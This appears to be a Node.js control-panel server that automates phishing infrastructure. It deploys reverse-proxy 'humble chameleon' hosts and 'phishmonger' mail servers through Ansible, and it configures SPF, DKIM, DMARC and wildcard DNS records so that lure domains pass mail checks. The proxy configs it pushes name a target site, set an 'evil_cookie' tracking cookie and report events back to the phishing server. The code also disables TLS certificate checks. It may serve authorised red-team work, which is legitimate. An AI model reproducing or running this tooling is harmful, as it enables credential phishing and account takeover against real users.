fs = require('fs');
var Ansible = require('node-ansible');
dateFormat = require('dateformat');
var app = require('express')();
var http = require('http').Server(app);
http_resolver = require('http')
https_resolver = require('https')
var io = require('socket.io')(http);
var request = require('request')
var dns = require('dns');

var NodeRSA = require('node-rsa');
var key = new NodeRSA({b: 1024});

var public_key_oneliner = ''

//start off by getting dkim pair or generating a new dkim keypair
try{
  private_key = fs.readFileSync('dkim_private.pem').toString('utf8')
  public_key = fs.readFileSync('dkim_public.pem').toString('utf8')
  public_key_oneliner = public_key.replace(/^-.*-$/mg,'').replace(/[\r\n]+/g, '')
  console.log('Using existing DKIM keypair...')
}catch(err){
  console.log('no key pair found...')
  console.log("Generating New Keypair For DKIM:")
  private_key = key.exportKey('pkcs8-private')
  public_key = key.exportKey('public')
  public_key_oneliner = public_key.replace(/^-.*-$/mg,'').replace(/[\r\n]+/g, '')
  fs.writeFileSync('dkim_private.pem', private_key)
  fs.writeFileSync('dkim_public.pem', public_key)
  console.log(private_key)
  console.log(public_key) 
}

app.get('/', function(req, res){
  res.sendFile(__dirname + '/anthill.html');
});

app.get('/favicon.ico', function(req, res){
  res.sendFile(__dirname + '/resources/favicon.ico');
});

app.get('/resources/jquery.min.js', function(req, res){
  res.sendFile(__dirname + '/resources/jquery.min.js');
});

app.get('/resources/jquery.cookie.js', function(req, res){
  res.sendFile(__dirname + '/resources/jquery.cookie.js');
});

app.get('/resources/socket.io.js', function(req, res){
  res.sendFile(__dirname + '/resources/socket.io.js');
});

app.get('/resources/images/phishship.gif', function(req, res){
  res.sendFile(__dirname + '/resources/images/phishship.gif');
});

app.get('/resources/images/chameleon.gif', function(req, res){
  res.sendFile(__dirname + '/resources/images/chameleon.gif');
});

io.on('connection', function(socket){

  socket.on('get_status_hc', function(query){

    // Set the headers for the request
    var headers = {
        //'Content-Type': 'application/json',
        //'Content-Length': Buffer.byteLength(post_data),
        //'Cookie': cookie
        'X-Api-Key': query.api_key
    };
    // Configure the request
    var options = {
        hostname: 'dns.api.gandi.net',
        path: `/api/v5/domains/${query.domain}/records`,
        method: 'GET',
        headers: headers
    };
    
    https_resolver.get(options,  (resp) => {
      let data = '';
    
      resp.on('data', (chunk) => {
        data += chunk;
      });
    
      resp.on('end', () => {
        io.emit('gandi_status_hc', JSON.parse(data))
      });
    
    }).on("error", (err) => {
       console.log("Error: " + err.message);
    });
  });

  socket.on('get_status_pm', function(query){
    var headers = {
        'X-Api-Key': query.api_key
    };
    var options = {
        hostname: 'dns.api.gandi.net',
        path: `/api/v5/domains/${query.domain}/records`,
        method: 'GET',
        headers: headers
    };
    
    https_resolver.get(options,  (resp) => {
      let data = '';
    
      resp.on('data', (chunk) => {
        data += chunk;
      });
    
      resp.on('end', () => {
        io.emit('gandi_status_pm', JSON.parse(data))
      });
    
    }).on("error", (err) => {
       console.log("Error: " + err.message);
    });
  });

  socket.on('clear_dns_records_hc', function(query){

    // Set the headers for the request
    var headers = {
        'X-Api-Key': query.api_key
    };
    // Configure the request
    var options = {
        hostname: 'dns.api.gandi.net',
        path: `/api/v5/domains/${query.domain}/records`,
        method: 'GET',
        headers: headers
    };
    
    https_resolver.get(options,  (resp) => {
      let data = '';
    
      resp.on('data', (chunk) => {
        data += chunk;
      });
    
      resp.on('end', () => {
        JSON.parse(data).forEach(function(record){
          //if((record.rrset_type == "A") || (record.rrset_type == "CNAME")){
          if((record.rrset_type == "A") || (record.rrset_type == "CNAME") || (record.rrset_type == "SRV") || (record.rrset_type == "TXT")){
            deleteRecord(record.rrset_href, query.api_key)
          }
        })
      });
    
    }).on("error", (err) => {
       console.log("Error: " + err.message);
    });
  });

  socket.on('clear_dns_records_pm', function(query){

    // Set the headers for the request
    var headers = {
        'X-Api-Key': query.api_key
    };
    // Configure the request
    var options = {
        hostname: 'dns.api.gandi.net',
        path: `/api/v5/domains/${query.domain}/records`,
        method: 'GET',
        headers: headers
    };
    
    https_resolver.get(options,  (resp) => {
      let data = '';
    
      resp.on('data', (chunk) => {
        data += chunk;
      });
    
      resp.on('end', () => {
        JSON.parse(data).forEach(function(record){
          //if((record.rrset_type == "A") || (record.rrset_type == "CNAME")){
          if((record.rrset_type == "A") || (record.rrset_type == "CNAME") || (record.rrset_type == "SRV") || (record.rrset_type == "MX") || (record.rrset_type == "TXT")){
            deleteRecord(record.rrset_href, query.api_key)
          }
        })
      });
    
    }).on("error", (err) => {
       console.log("Error: " + err.message);
    });
  });


  socket.on('set_dns_records_hc', function(query){
    dns.resolve(query.pm_domain, function(err, addresses){
      let new_spf_record = {"rrset_name": "@","rrset_type": "TXT","rrset_ttl":600,"rrset_values":['"v=spf1 mx a ptr ip4:38.126.169.96/28 ip4:' + addresses[0] + '/32 include:gandi.net include:sendgrid.net -all"']}
      createRecord(query.domain, JSON.stringify(new_spf_record) , query.api_key)
    })
    let new_base_record = {"rrset_name": "@","rrset_type": "A","rrset_ttl":600,"rrset_values":[query.server_ip]}
    createRecord(query.domain, JSON.stringify(new_base_record) , query.api_key)
    let new_star_record = {"rrset_name": "*","rrset_type": "A","rrset_ttl":600,"rrset_values":[query.server_ip]}
    createRecord(query.domain, JSON.stringify(new_star_record) , query.api_key)
    let new_dmarc_record = {"rrset_name": "_dmarc","rrset_type": "TXT","rrset_ttl":600,"rrset_values":["v=DMARC1; p=none"]}
    //let new_dmarc_record = {"rrset_name": "_dmarc","rrset_type": "TXT","rrset_ttl":600,"rrset_values":["v=DMARC1; p=quarantine; rua=mailto:user@mydomain.com; ruf=mailto:user@domain.com; fo=1; adkim=s; aspf=s;"]}
    createRecord(query.domain, JSON.stringify(new_dmarc_record) , query.api_key)
    let new_dkim_record = {"rrset_name": "default._domainkey","rrset_type": "TXT","rrset_ttl":600,"rrset_values":['"v=DKIM1; k=rsa; p=' + public_key_oneliner + '"']}
    createRecord(query.domain, JSON.stringify(new_dkim_record) , query.api_key)
  });

  socket.on('set_dns_records_pm', function(query){
    let new_base_record = {"rrset_name": "@","rrset_type": "A","rrset_ttl":600,"rrset_values":[query.server_ip]}
    createRecord(query.domain, JSON.stringify(new_base_record) , query.api_key)
    let new_star_record = {"rrset_name": "*","rrset_type": "A","rrset_ttl":600,"rrset_values":[query.server_ip]}
    createRecord(query.domain, JSON.stringify(new_star_record) , query.api_key)
    let new_spf_record = {"rrset_name": "@","rrset_type": "TXT","rrset_ttl":600,"rrset_values":['"v=spf1 mx a ptr ip4:38.126.169.96/28 ip4:' + query.server_ip + '/32 include:gandi.net include:sendgrid.net -all"']}
    createRecord(query.domain, JSON.stringify(new_spf_record) , query.api_key)
    let new_dmarc_record = {"rrset_name": "_dmarc","rrset_type": "TXT","rrset_ttl":600,"rrset_values":["v=DMARC1; p=none"]}
    createRecord(query.domain, JSON.stringify(new_dmarc_record) , query.api_key)
    let new_dkim_record = {"rrset_name": "default._domainkey","rrset_type": "TXT","rrset_ttl":600,"rrset_values":['"v=DKIM1; k=rsa; p=' + public_key_oneliner + '"']}
    createRecord(query.domain, JSON.stringify(new_dkim_record) , query.api_key)
    let new_mx_record = {"rrset_name": "@","rrset_type": "MX","rrset_ttl":600,"rrset_values":['10 mx.' + query.domain + '.']}
    createRecord(query.domain, JSON.stringify(new_mx_record) , query.api_key)
    let new_mx_a_record = {"rrset_name": "MX","rrset_type": "A","rrset_ttl":600,"rrset_values":[query.server_ip]}
    createRecord(query.domain, JSON.stringify(new_mx_a_record) , query.api_key)
  });

  socket.on('kali_update', function(query){
    var command = new Ansible.Playbook().playbook('playbooks/kali_update')

    fs.writeFileSync('./my_inventory.txt',"[Server]\n")
    fs.appendFileSync('./my_inventory.txt', query.pm_domain + "\n\n")
    fs.appendFileSync('./my_inventory.txt', "[Server:vars]\nansible_ssh_common_args='-o StrictHostKeyChecking=no'\nansible_python_interpreter=/usr/bin/python3\n")

    command.inventory('./my_inventory.txt')
    command.verbose('vvv')

    command.on('stdout', function(data) {
        //console.log(data.toString()); 
        io.emit('server_message', data.toString())
    });

    command.on('stderr', function(data) { console.log(data.toString()); });

    var promise = command.exec();

    promise.then(function(result) {
      io.emit('server_message', "All done setting up!")
      fs.unlink('./my_inventory.txt', (err) => {
        if (err) throw err;
      });
    })
  });

 socket.on('deploy_hc', function(query){
    var command = new Ansible.Playbook().playbook('playbooks/humble_setup')

    fs.writeFileSync('./my_inventory.txt',"[Server]\n")
    fs.appendFileSync('./my_inventory.txt', query.hc_domain + "\n\n")
    fs.appendFileSync('./my_inventory.txt', "[Server:vars]\nansible_ssh_common_args='-o StrictHostKeyChecking=no'\nansible_python_interpreter=/usr/bin/python3\n")

    command.inventory('./my_inventory.txt')

    command.variables({
      "hc_domain": query.hc_domain,
      "api_key": query.api_key,
      "primary_target": query.primary_target,
      "secondary_target": query.secondary_target,
      "search_string": query.search_string,
      "wwwroot": query.wwwroot,
      "admin_cookie": query.admin_cookie,
      "set_admin_url": query.set_admin_url,
      "phishmonger_domain": query.pishmonger_domain,
      "phishmonger_cookie": query.phishmonger_cookie,
      "email": query.email
    });

    //command.verbose('v')

    command.on('stdout', function(data) {
        //console.log(data.toString()); 
        io.emit('server_message', data.toString())
    });

    command.on('stderr', function(data) { console.log(data.toString()); });

    var promise = command.exec();

    promise.then(function(result) {
      io.emit('server_message', "All done setting up!")
      fs.unlink('./my_inventory.txt', (err) => {
        if (err) throw err;
      });
    })
  });

  socket.on('deploy_pm', function(query){
    var command = new Ansible.Playbook().playbook('playbooks/phishmonger_setup')

    fs.writeFileSync('./my_inventory.txt',"[Server]\n")
    fs.appendFileSync('./my_inventory.txt', query.pm_domain + "\n\n")
    fs.appendFileSync('./my_inventory.txt', "[Server:vars]\nansible_ssh_common_args='-o StrictHostKeyChecking=no'\nansible_python_interpreter=/usr/bin/python3\n")

    command.inventory('./my_inventory.txt')

    command.variables({
      "pm_domain": query.pm_domain,
      "api_key": query.api_key,
      "admin_cookie": query.admin_cookie,
      "set_admin_url": query.set_admin_url,
      "bot_id": query.bot_id,
      "chat_id": query.chat_id,
      "email": query.email
    });

    //command.verbose('v')

    command.on('stdout', function(data) {
        //console.log(data.toString()); 
        io.emit('server_message', data.toString())
    });

    command.on('stderr', function(data) { console.log(data.toString()); });

    var promise = command.exec();

    promise.then(function(result) {
      io.emit('server_message', "All done setting up!")
      fs.unlink('./my_inventory.txt', (err) => {
        if (err) throw err;
      });
    })
  });

  socket.on('add_hc_domain', function(query){

    var new_config = {
      "primary_target": query.primary_target,
      "secondary_target": query.secondary_target,
      "search_string": query.search_string,
      "wwwroot": query.wwwroot,
      "tracking_cookie": "evil_cookie",
      "replacements": {
        "string_to_be_replaced": "replacement_string"
      },
      "custom_headers": {},
      "snitch": {
        "snitch_string": "Logoff",
        "redirect_url": "https://real.domain.com/index.html"
      },
      "logging_endpoint": {
        "host": query.pishmonger_domain,
        "url": "/create_event",
        "auth_cookie": "admin_cookie=" + query.phishmonger_cookie
      }
    }

    process.env['NODE_TLS_REJECT_UNAUTHORIZED'] = 0
    var admin_cookie = 'admin_cookie=' + query.admin_cookie + ';'
    var api_headers = {
      "Connection": "close", 
      "Content-Length": "0", 
      "Origin": "https://" + query.existing_hc_domain, 
      "Accept": "*/*", 
      "Accept-Encoding": "identity", 
      'Cookie': admin_cookie
    }

    var api_options = {
      url: "https://" + query.existing_hc_domain + "/config",
      headers: api_headers,
      method: "put",
    }

    request(api_options, function (error, response, body) {
      current_config = JSON.parse(body)
      current_config[query.hc_domain] = new_config

      var api_post_headers = {
        "Connection": "close", 
        "Content-Length": JSON.stringify(current_config).length.toString(), 
        "Origin": "https://" + query.existing_hc_domain, 
        "Accept": "*/*", 
        "Accept-Encoding": "identity", 
        'Cookie': admin_cookie
      }

      var api_post_options = {
        url: "https://" + query.existing_hc_domain + "/config",
        headers: api_post_headers,
        method: "post",
        body: JSON.stringify(current_config)
      }

      request(api_post_options, function (error, response, body) {
        console.log(body)
        io.emit('server_message', body)
        var command = new Ansible.Playbook().playbook('playbooks/add_hc_domain')
  
        fs.writeFileSync('./my_inventory.txt',"[Server]\n")
        fs.appendFileSync('./my_inventory.txt', query.hc_domain + "\n\n")
        //fs.appendFileSync('./my_inventory.txt', query.hc_domain + "\tansible_user=other_user\n\n")
        fs.appendFileSync('./my_inventory.txt', "[Server:vars]\nansible_ssh_common_args='-o StrictHostKeyChecking=no'\nansible_python_interpreter=/usr/bin/python3\n")
 
        command.inventory('./my_inventory.txt')
  
        command.variables({
          "api_key": query.api_key,
          "hc_domain": query.hc_domain,
          "primary_target": query.primary_target,
          "secondary_target": query.secondary_target,
          "search_string": query.search_string,
          "wwwroot": query.wwwroot,
          "admin_cookie": query.admin_cookie,
          "set_admin_url": query.set_admin_url,
          "phishmonger_domain": query.pishmonger_domain,
          "phishmonger_cookie": query.phishmonger_cookie,
          "email": query.email
        });
  
        //command.verbose('v')
  
        command.on('stdout', function(data) {
          //console.log(data.toString()); 
          io.emit('server_message', data.toString())
        });
  
        command.on('stderr', function(data) { console.log(data.toString()); });
  
        var promise = command.exec();
  
        promise.then(function(result) {
          io.emit('server_message', "All done setting up!")
          fs.unlink('./my_inventory.txt', (err) => {
            if (err) throw err;
          });
        })
      })
    })
  });
});

http.listen(4000, function(){
  //console.log('listening on *:4000');
  console.log('listening on *:4000');
});

//catch any server exceptions instead of exiting
http.on('error', function (e) {
  console.log(dateFormat("isoDateTime") + " " + e);
});

//catch any node exceptions instead of exiting
process.on('uncaughtException', function (err) {
  console.log(dateFormat("isoDateTime") + " " + 'Caught exception: ', err);
});

function wait (timeout) {
  return new Promise((resolve) => {
    setTimeout(() => {
      resolve()
    }, (timeout + Math.random()*1000))
  })
}

function deleteRecord(href, api_key){
  var headers = {
      'Content-Type': 'application/json',
      'X-Api-Key': api_key
  };
  // Configure the request
  var options = {
      hostname: 'dns.api.gandi.net',
      //path: '/api/v5/zones',
      path: href,
      method: 'DELETE',
      headers: headers
  };
  delete_request = https_resolver.request(options,  (resp) => {
    let data = '';

    resp.on('data', (chunk) => {
      data += chunk;
    });

    resp.on('end', () => {
      console.log(data)
    });

  }).on("error", (err) => {
     console.log("Error: " + err.message);
  });

  delete_request.end()
}

function createRecord(domain, record, api_key){
  var headers = {
      'Content-Type': 'application/json',
      'X-Api-Key': api_key,
      'Content-Length': Buffer.byteLength(record)
  };
  // Configure the request
  var options = {
      hostname: 'dns.api.gandi.net',
      path: '/api/v5/domains/'+ domain +'/records',
      method: 'POST',
      headers: headers
  };
  
  var post_request =  https_resolver.request(options,  (resp) => {
    let data = '';

    resp.on('data', (chunk) => {
      data += chunk;
    });
  
    resp.on('end', () => {
      console.log(data)
    });

  }).on("error", (err) => {
     console.log("Error: " + err.message);
  });
  
  post_request.write(record)
  post_request.end()
  
}
